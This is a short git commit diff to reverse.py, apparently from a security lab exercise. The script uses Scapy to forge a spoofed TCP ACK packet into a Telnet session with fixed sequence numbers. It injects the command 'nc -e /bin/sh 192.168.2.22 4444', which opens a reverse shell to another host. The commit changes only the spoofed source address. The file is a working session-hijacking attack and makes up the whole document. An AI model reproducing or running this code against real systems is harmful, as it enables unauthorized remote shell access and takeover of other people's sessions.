d6d4bcc353914775d0e8d1a16a7dcd837038fdf5
Ensaodocker <104729661+Ensaodocker@users.noreply.github.com>
2022-06-06 12:00:36 +0100

    Update reverse.py

--- reverse.py
+++ reverse.py
@@ -1,6 +1,6 @@
 from scapy.all import *
 
-IPLayer = IP(src="192.168.2.22", dst="192.168.2.33")
+IPLayer = IP(src="192.168.2.11", dst="192.168.2.33")
 TCPLayer = TCP(sport=53688, dport=23, flags="A", seq=963469140, ack=3344289089)
 
 data = "\n nc -e /bin/sh 192.168.2.22 4444 \n"
